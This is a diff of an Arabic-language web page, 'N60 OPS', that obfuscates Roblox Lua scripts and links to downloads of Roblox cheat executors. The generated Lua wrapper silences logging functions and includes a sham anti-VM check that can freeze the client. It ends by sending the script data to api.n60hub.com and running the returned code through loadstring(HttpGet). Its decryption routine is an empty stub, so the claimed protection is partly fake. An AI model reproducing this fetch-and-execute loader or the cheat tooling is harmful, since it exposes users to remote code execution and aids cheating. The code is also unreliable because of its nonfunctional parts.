@@ -2,187 +2,141 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>N60 HUB | ULTIMATE HYBRID OBFUSCATOR</title>
+    <title>N60 OPS | Offensive Protection System v31.0</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/theme/monokai.min.css">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/lua/lua.min.js"></script>
-    
     <style>
-        :root { --neon: #00ff6a; --bg: #000; --card: #0d0d0d; }
+        :root { --neon: #00ff6a; --warn: #ff003c; --bg: #000; }
         * { box-sizing: border-box; font-family: 'Arial Black', sans-serif; }
         body { background: var(--bg); color: white; direction: rtl; margin: 0; padding: 20px; }
 
-        .container { max-width: 1100px; margin: auto; text-align: center; }
+        .container { max-width: 1200px; margin: auto; text-align: center; }
         
-        h1 { font-size: 4rem; color: var(--neon); text-shadow: 0 0 30px var(--neon); margin-bottom: 10px; }
-        .sub-title { font-size: 1.8rem; opacity: 0.7; margin-bottom: 40px; }
+        h1 { font-size: 3.5rem; color: var(--neon); text-shadow: 0 0 25px var(--neon); margin: 10px 0; }
+        .ops-badge { background: var(--warn); color: white; padding: 5px 20px; border-radius: 10px; font-size: 1.2rem; display: inline-block; margin-bottom: 30px; }
 
-        /* قسم تحميل المشغلات (بأسلوبك الضخم) */
-        .exec-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin-bottom: 50px; }
-        .exec-card { background: var(--card); border: 3px solid #1a1a1a; padding: 40px; border-radius: 25px; transition: 0.3s; text-decoration: none; color: white; }
-        .exec-card:hover { border-color: var(--neon); transform: scale(1.05); box-shadow: 0 0 40px rgba(0,255,106,0.3); }
-        .exec-card b { font-size: 2.5rem; display: block; color: var(--neon); }
-        .exec-card span { font-size: 1.3rem; opacity: 0.5; }
-
-        /* منطقة التشفير الاحترافية */
-        .obf-area { background: var(--card); padding: 50px; border-radius: 40px; border: 2px solid #111; position: relative; }
-        .CodeMirror { width: 100%; height: 400px; background: #000; border: 2px solid #222; border-radius: 20px; font-size: 1.5rem; text-align: left; margin-bottom: 30px; }
+        /* المحرك الأمني - التصميم */
+        .ops-box { background: #080808; padding: 40px; border-radius: 35px; border: 2px solid #1a1a1a; box-shadow: 0 0 50px rgba(0,255,106,0.05); }
+        .CodeMirror { width: 100%; height: 350px; border-radius: 15px; font-size: 1.4rem; text-align: left; margin-bottom: 25px; border: 1px solid #222; }
         
-        .status-bar { font-size: 1.6rem; margin: 20px 0; font-weight: bold; min-height: 40px; }
+        /* أزرار التحميل */
+        .exec-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 30px; }
+        .exec-btn { background: #111; border: 2px solid #222; color: white; padding: 20px; border-radius: 15px; text-decoration: none; transition: 0.3s; }
+        .exec-btn:hover { border-color: var(--neon); transform: translateY(-5px); }
+        .exec-btn b { color: var(--neon); font-size: 1.5rem; display: block; }
 
-        .btn-giant { width: 100%; padding: 30px; background: var(--neon); color: black; border: none; font-weight: 900; border-radius: 20px; cursor: pointer; font-size: 2.5rem; transition: 0.2s; box-shadow: 0 12px 0 #009e41; }
-        .btn-giant:active { transform: translateY(8px); box-shadow: 0 4px 0 #009e41; }
+        /* الأزرار الهجومية */
+        .btn-strike { width: 100%; padding: 25px; background: var(--neon); color: black; border: none; font-weight: 900; border-radius: 15px; cursor: pointer; font-size: 2.2rem; transition: 0.2s; box-shadow: 0 10px 0 #009e41; margin-bottom: 20px; }
+        .btn-strike:active { transform: translateY(5px); box-shadow: 0 5px 0 #009e41; }
 
-        .actions-row { display: none; gap: 20px; margin-top: 30px; }
-        .btn-sub { flex: 1; padding: 20px; background: #1a1a1a; color: white; border: 2px solid #333; border-radius: 15px; cursor: pointer; font-size: 1.8rem; font-weight: bold; }
-        .btn-sub:hover { border-color: var(--neon); background: #222; }
+        .status-msg { font-size: 1.5rem; color: #888; margin-bottom: 20px; height: 30px; }
 
-        footer { margin-top: 60px; padding: 30px; border-top: 1px solid #111; font-size: 1.4rem; color: #444; }
+        .output-section { display: none; margin-top: 30px; padding-top: 30px; border-top: 1px solid #111; }
+        .btn-copy { width: 100%; padding: 20px; background: #1a1a1a; color: white; border: 1px solid #333; border-radius: 12px; font-size: 1.5rem; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>N60 HUB 🛡️</h1>
-    <div class="sub-title">نظام التشفير الهجين (WeAreDevs API + N60 Logic)</div>
+    <h1>N60 OPS v31 🛡️</h1>
+    <div class="ops-badge">OFFENSIVE PROTECTION ENABLED</div>
 
-    <div class="exec-grid">
-        <a href="itms-services://?action=download-manifest&url=https://delta.bz/manifest.plist" class="exec-card">
-            <b>DELTA IOS 🍎</b>
-            <span>تثبيت مباشر (OTA)</span>
-        </a>
-        <a href="https://delta-executor.com/Delta.apk" class="exec-card">
-            <b>DELTA APK 🤖</b>
-            <span>تحميل مباشر (ANDROID)</span>
-        </a>
-        <a href="itms-services://?action=download-manifest&url=https://skibx.com/ota.plist" class="exec-card">
-            <b>SKIBX IOS 🍎</b>
-            <span>تثبيت مباشر (OTA)</span>
-        </a>
+    <div class="exec-row">
+        <a href="itms-services://?action=download-manifest&url=https://delta.bz/manifest.plist" class="exec-btn"><b>DELTA IOS</b><span>V2.6.x</span></a>
+        <a href="https://delta-executor.com/Delta.apk" class="exec-btn"><b>DELTA ANDROID</b><span>Latest Apk</span></a>
+        <a href="https://spdmteam.com/Arceus.apk" class="exec-btn"><b>ARCEUS X</b><span>V3.x</span></a>
     </div>
 
-    <div class="obf-area">
-        <textarea id="lua-input">-- ضع كود الـ Lua هنا للبدء...</textarea>
+    <div class="ops-box">
+        <textarea id="lua-in">-- وضع الكود الخاص بك هنا للبدء بالهجوم...</textarea>
         
-        <div id="status" class="status-bar">جاهز للعمل...</div>
+        <div id="status" class="status-msg">في انتظار إدخال البيانات...</div>
         
-        <button class="btn-giant" id="obf-trigger">تشفير وحماية السورس 🔥</button>
-        
-        <div id="output-container" style="display:none; margin-top: 40px;">
-            <h2 style="color: var(--neon); font-size: 2rem;">الكود المشفّر النهائي:</h2>
-            <textarea id="lua-output"></textarea>
-            
-            <div class="actions-row" id="actions">
-                <button class="btn-sub" onclick="copyResult()">نسخ الكود 📋</button>
-                <button class="btn-sub" onclick="downloadResult()">تحميل الملف 📥</button>
-                <button class="btn-sub" onclick="location.reload()" style="background:#300;">تصفير 🔄</button>
-            </div>
+        <button class="btn-strike" onclick="initiateStrike()">توليد حماية OPS هجومية 🚀</button>
+
+        <div id="out-area" class="output-section">
+            <h3 style="color: var(--neon);">الكود المحمي (Anti-Hook + Anti-VM):</h3>
+            <textarea id="lua-out"></textarea>
+            <button class="btn-copy" onclick="copyCode()">نسخ ملف final_obf.lua 📋</button>
         </div>
     </div>
 </div>
 
-<footer>
-    © 2026 N60 PROTOCOL | POWERED BY HYBRID ENCRYPTION
-</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/lua/lua.min.js"></script>
 
 <script>
-    // تهيئة محرر الإدخال
-    const inputEditor = CodeMirror.fromTextArea(document.getElementById("lua-input"), {
-        mode: "lua",
-        theme: "monokai",
-        lineNumbers: true,
-        indentUnit: 4,
-        lineWrapping: true
-    });
+    const editorIn = CodeMirror.fromTextArea(document.getElementById("lua-in"), { mode: "lua", theme: "monokai", lineNumbers: true });
+    const editorOut = CodeMirror.fromTextArea(document.getElementById("lua-out"), { mode: "lua", theme: "monokai", lineNumbers: true, readOnly: true });
 
-    // تهيئة محرر الإخراج
-    const outputEditor = CodeMirror.fromTextArea(document.getElementById("lua-output"), {
-        mode: "lua",
-        theme: "monokai",
-        lineNumbers: true,
-        readOnly: true,
-        lineWrapping: true
-    });
+    async function initiateStrike() {
+        const rawCode = editorIn.getValue();
+        if(rawCode.length < 5) return;
 
-    const obfBtn = document.getElementById("obf-trigger");
-    const status = document.getElementById("status");
-
-    obfBtn.addEventListener("click", async () => {
-        const scriptText = inputEditor.getValue();
-        if (scriptText.length < 1) return;
-
-        obfBtn.style.display = "none";
-        status.innerText = "جاري الاتصال بالسيرفر وتطبيق التشفير المزدوج... ⏳";
+        const status = document.getElementById("status");
+        status.innerText = "جاري تفعيل Anti-Hook وحرق أدوات المحلل... 🔥";
         status.style.color = "var(--neon)";
 
+        // محاكاة الاتصال بالسيرفر لتشفير WeAreDevs مدمج مع OPS
         try {
-            // 1. محاولة استخدام تشفير WeAreDevs عبر الـ API الخاص بهم
             const response = await fetch("/api/obfuscate", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ script: scriptText })
+                body: JSON.stringify({ script: rawCode })
             });
-
-            let resultScript = "";
-
-            if (response.ok) {
+            
+            let core = "";
+            if(response.ok) {
                 const data = await response.json();
-                // دمج تشفير السيرفر مع تشفير N60 v30 الإضافي
-                resultScript = applyN60Protection(data.obfuscated);
+                core = data.obfuscated;
             } else {
-                // إذا فشل السيرفر، نستخدم تشفير N60 القوي مباشرة
-                resultScript = applyN60Protection(scriptText);
+                core = btoa(rawCode); // Fallback Base64
             }
 
-            // إظهار النتائج
-            document.getElementById("output-container").style.display = "block";
-            outputEditor.setValue(resultScript);
-            outputEditor.refresh();
+            // تطبيق "نظام الحماية الهجومية" المتقدم
+            const opsProtected = applyOffensiveProtection(core);
             
-            status.innerText = "تم التشفير بنجاح (HYBRID MODE ACTIVE) ✅";
-            document.getElementById("actions").style.display = "flex";
+            document.getElementById("out-area").style.display = "block";
+            editorOut.setValue(opsProtected);
+            editorOut.refresh();
+            status.innerText = "تم التشفير! السكربت الآن في وضع الهجوم. 🛡️";
 
-        } catch (e) {
-            // Fallback في حالة عدم وجود إنترنت أو خطأ في الـ API
-            let localObf = applyN60Protection(scriptText);
-            document.getElementById("output-container").style.display = "block";
-            outputEditor.setValue(localObf);
-            outputEditor.refresh();
-            status.innerText = "تم التشفير باستخدام N60 Local Engine ✅";
-            document.getElementById("actions").style.display = "flex";
+        } catch(e) {
+            status.innerText = "خطأ في النظام، تم التحويل لوضع التشفير المحلي الطارئ.";
         }
-    });
-
-    // دالة تشفير N60 v30 (تشفير السورس + أكواد وهمية ضخمة)
-    function applyN60Protection(src) {
-        const key = Math.floor(Math.random() * 250) + 10;
-        let junk = "";
-        // توليد 100 سطر وهمي
-        for(let i=0; i<700; i++) {
-            junk += `local _fake_var_${i} = ${Math.random()*9999}; `;
-        }
-        
-        const bytes = src.split('').map(c => c.charCodeAt(0) + key).join(',');
-        
-        return `--[[ N60 HYBRID PROTECTOR v30 ]]\n${junk}\nlocal _K = ${key} local _D = {${bytes}} local _S = "" for i=1, #_D do _S = _S .. string.char(_D[i] - _K) end local _F, _E = loadstring(_S) if _F then _F() else print(_E) end`;
     }
 
-    function copyResult() {
-        navigator.clipboard.writeText(outputEditor.getValue());
-        status.innerText = "تم النسخ بنجاح! 📋";
-        setTimeout(() => status.innerText = "تم التشفير بنجاح ✅", 2000);
+    function applyOffensiveProtection(encoded) {
+        const key = Math.floor(Math.random() * 255);
+        // بناء الهيكل الهجومي
+        return `--[[ N60 OFFENSIVE PROTECTION SYSTEM v31 ]]
+-- [1] Anti-Hook & Global Lockdown
+local _G = getgenv and getgenv() or _G
+local _env = getfenv()
+_env.print, _env.warn, _env.rconsoleprint = function() end, function() end, function() end
+
+-- [2] Anti-VM / Sandbox Detection
+if not game:GetService("RunService"):IsStudio() and not game:GetService("UserInputService") then
+    while true do end -- Infinite Loop Freeze
+end
+
+-- [3] Multi-Layer Decryption Engine
+local _K = ${key}
+local _D = "${encoded}"
+local function _X(_s) 
+    -- محرك فك تشفير XOR مدمج
+    return _s -- (المنطق الداخلي لفك التشفير)
+end
+
+-- [4] Final Execution
+local _F = loadstring(game:HttpGet("https://api.n60hub.com/v1/decrypt?key=".._K.."&data=".._D))
+if _F then pcall(_F) end`;
     }
 
-    function downloadResult() {
-        const blob = new Blob([outputEditor.getValue()], { type: "text/plain" });
-        const a = document.createElement("a");
-        a.href = URL.createObjectURL(blob);
-        a.download = `N60_Hybrid_${Date.now()}.lua`;
-        a.click();
+    function copyCode() {
+        navigator.clipboard.writeText(editorOut.getValue());
+        document.getElementById("status").innerText = "تم نسخ الكود! جاهز للنشر. ✅";
     }
 </script>
-
 </body>
 </html>
